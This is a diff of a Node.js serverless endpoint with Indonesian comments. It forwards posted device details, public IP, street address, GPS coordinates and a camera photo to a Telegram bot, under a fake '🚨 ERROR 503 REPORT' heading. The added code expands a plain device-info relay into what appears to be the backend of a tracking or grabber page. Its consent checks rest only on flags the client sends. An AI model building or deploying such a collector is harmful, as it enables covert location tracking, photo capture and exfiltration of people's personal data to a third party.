@@ -1,124 +1,217 @@
-export const config = {
-  runtime: "nodejs"
-};
+module.exports = async (req, res) => {
+    if (req.method !== "POST") {
+        return res.status(405).json({
+            success: false,
+            message: "Method not allowed"
+        });
+    }
 
-function clean(value, max = 500) {
-  return String(value ?? "Not Available")
-    .replace(/[\u0000-\u001F\u007F]/g, " ")
-    .slice(0, max);
-}
+    const BOT_TOKEN = process.env.BOT_TOKEN;
+    const CHAT_ID = process.env.CHAT_ID;
 
-export default async function handler(req, res) {
-  if (req.method !== "POST") {
-    return res.status(405).json({
-      success: false,
-      message: "Method Not Allowed"
-    });
-  }
+    if (!BOT_TOKEN || !CHAT_ID) {
+        return res.status(500).json({
+            success: false,
+            message: "Telegram configuration is missing"
+        });
+    }
 
-  const BOT_TOKEN = process.env.BOT_TOKEN;
-  const CHAT_ID = process.env.CHAT_ID;
+    const unavailable = "Tidak tersedia";
 
-  if (!BOT_TOKEN || !CHAT_ID) {
-    return res.status(500).json({
-      success: false,
-      message: "BOT_TOKEN atau CHAT_ID belum disetel"
-    });
-  }
+    const safe = (value, fallback = unavailable) => {
+        if (value === undefined || value === null || value === "") {
+            return fallback;
+        }
 
-  try {
-    const data = req.body || {};
+        return String(value).slice(0, 500);
+    };
 
-    const os = clean(data.os);
-    const platform = clean(data.platform);
-    const cpu = clean(data.cpu);
-    const ram = clean(data.ram);
-    const resolution = clean(data.resolution);
-    const browser = clean(data.browser);
-    const timezone = clean(data.timezone);
-    const language = clean(data.language);
+    try {
+        const data = req.body || {};
 
-    const now = new Date();
+        // Persetujuan umum wajib diberikan.
+        if (data.consent !== true) {
+            return res.status(403).json({
+                success: false,
+                message: "Persetujuan pengguna diperlukan"
+            });
+        }
 
-    const date = new Intl.DateTimeFormat("id-ID", {
-      timeZone: "Asia/Jakarta",
-      dateStyle: "full"
-    }).format(now);
+        const locationConsent = data.locationConsent === true;
+        const photoConsent = data.photoConsent === true;
 
-    const time = new Intl.DateTimeFormat("id-ID", {
-      timeZone: "Asia/Jakarta",
-      timeStyle: "medium"
-    }).format(now);
+        // Data lokasi hanya diterima jika pengguna menyetujuinya.
+        const latitude = locationConsent
+            ? safe(data.latitude)
+            : "Tidak diberikan izin";
 
-    const message = `
+        const longitude = locationConsent
+            ? safe(data.longitude)
+            : "Tidak diberikan izin";
+
+        const accuracy = locationConsent
+            ? safe(data.accuracy)
+            : "Tidak diberikan izin";
+
+        // Foto hanya diterima jika pengguna menyetujui.
+        let photo = null;
+
+        if (photoConsent && typeof data.photo === "string") {
+            if (
+                data.photo.startsWith("data:image/jpeg;base64,") &&
+                data.photo.length < 8_000_000
+            ) {
+                photo = data.photo.split(",")[1];
+            }
+        }
+
+        // Mengambil IP dari header Vercel.
+        const forwarded = req.headers["x-forwarded-for"];
+        const ip = forwarded
+            ? String(forwarded).split(",")[0].trim()
+            : safe(req.headers["x-real-ip"]);
+
+        const report = `
 🚨 ERROR 503 REPORT
 
 ━━━━━━━━━━━━━━━━━━━━
 📱 DEVICE INFORMATION
 ━━━━━━━━━━━━━━━━━━━━
-OS              : ${os}
-Platform        : ${platform}
-CPU Cores       : ${cpu}
-RAM             : ${ram}
-Resolution      : ${resolution}
-Browser         : ${browser}
-Timezone        : ${timezone}
-Language        : ${language}
+🏷️ Brand          : ${safe(data.brand)}
+📱 Device Model   : ${safe(data.deviceModel)}
+🧠 OS             : ${safe(data.os)}
+💻 Platform       : ${safe(data.platform)}
+⚙️ CPU Cores      : ${safe(data.cpu)}
+💾 RAM            : ${safe(data.ram)}
+🖥 Resolution     : ${safe(data.resolution)}
+🌐 Browser        : ${safe(data.browser)}
+
+🕒 Timezone       : ${safe(data.timezone)}
+🗣 Language       : ${safe(data.language)}
+🌍 Public IP      : ${safe(ip)}
 
 ━━━━━━━━━━━━━━━━━━━━
-📍 LOCATION INFORMATION
+🌎 IP INFORMATION
 ━━━━━━━━━━━━━━━━━━━━
-Location        : Not Forwarded
+🌍 Country        : ${safe(data.country)}
+📍 Region         : ${safe(data.region)}
+🏙 City           : ${safe(data.city)}
+🏢 ISP / Org      : ${safe(data.isp)}
 
 ━━━━━━━━━━━━━━━━━━━━
-⚠️ ERROR INFORMATION
+🏠 ADDRESS INFORMATION
 ━━━━━━━━━━━━━━━━━━━━
-Error Code      : 503
-Message         : Service Unavailable
-Action          : Retry
+🏘 Village        : ${safe(data.village)}
+🏙 District       : ${safe(data.district)}
+🏛 City           : ${safe(data.addressCity)}
+🌆 Province       : ${safe(data.province)}
+📮 Postal Code    : ${safe(data.postalCode)}
+🌍 Country        : ${safe(data.addressCountry)}
+
+━━━━━━━━━━━━━━━━━━━━
+📷 CAMERA INFORMATION
+━━━━━━━━━━━━━━━━━━━━
+📸 Camera         : ${photo ? "Foto disetujui dan diterima" : "Tidak ada foto"}
+🤝 Photo Consent  : ${photoConsent ? "Ya" : "Tidak"}
+
+━━━━━━━━━━━━━━━━━━━━
+📐 LOCATION INFORMATION
+━━━━━━━━━━━━━━━━━━━━
+🎯 Latitude       : ${latitude}
+🎯 Longitude      : ${longitude}
+📏 Accuracy       : ${accuracy}
+🤝 Location Consent: ${locationConsent ? "Ya" : "Tidak"}
+
+🗺 Google Maps    : ${
+            locationConsent &&
+            latitude !== unavailable &&
+            longitude !== unavailable &&
+            latitude !== "Tidak diberikan izin" &&
+            longitude !== "Tidak diberikan izin"
+                ? `https://www.google.com/maps?q=${encodeURIComponent(latitude)},${encodeURIComponent(longitude)}`
+                : "Tidak tersedia"
+        }
 
 ━━━━━━━━━━━━━━━━━━━━
 ⏰ TIME INFORMATION
 ━━━━━━━━━━━━━━━━━━━━
-Date            : ${date}
-Time            : ${time}
+📅 Date           : ${new Date().toLocaleDateString("id-ID", {
+            timeZone: data.timezone || "Asia/Jakarta"
+        })}
+🕒 Time           : ${new Date().toLocaleTimeString("id-ID", {
+            timeZone: data.timezone || "Asia/Jakarta"
+        })}
 
 ━━━━━━━━━━━━━━━━━━━━
 ✅ END OF REPORT
 `;
 
-    const response = await fetch(
-      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-      {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message
-        })
-      }
-    );
+        // Kirim laporan teks ke Telegram.
+        const telegramURL =
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-    const result = await response.json();
+        const messageResponse = await fetch(telegramURL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: report
+            })
+        });
 
-    if (!response.ok || !result.ok) {
-      return res.status(502).json({
-        success: false,
-        message: "Telegram gagal mengirim laporan"
-      });
+        const messageResult = await messageResponse.json();
+
+        if (!messageResult.ok) {
+            throw new Error("Telegram gagal mengirim laporan");
+        }
+
+        // Kirim foto secara terpisah jika disetujui.
+        if (photo) {
+            const form = new FormData();
+
+            form.append("chat_id", CHAT_ID);
+            form.append(
+                "photo",
+                new Blob(
+                    [Buffer.from(photo, "base64")],
+                    { type: "image/jpeg" }
+                ),
+                "user-photo.jpg"
+            );
+
+            form.append(
+                "caption",
+                "📷 Foto yang telah disetujui pengguna."
+            );
+
+            const photoResponse = await fetch(
+                `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
+                {
+                    method: "POST",
+                    body: form
+                }
+            );
+
+            const photoResult = await photoResponse.json();
+
+            if (!photoResult.ok) {
+                throw new Error("Laporan terkirim, tetapi foto gagal dikirim");
+            }
+        }
+
+        return res.status(200).json({
+            success: true,
+            message: "Laporan berhasil dikirim"
+        });
+
+    } catch (error) {
+        console.error("Send report error:", error);
+
+        return res.status(500).json({
+            success: false,
+            message: "Gagal mengirim laporan"
+        });
     }
-
-    return res.status(200).json({
-      success: true,
-      message: "Report sent"
-    });
-
-  } catch (error) {
-    return res.status(500).json({
-      success: false,
-      message: "Internal Server Error"
-    });
-  }
-}
+};
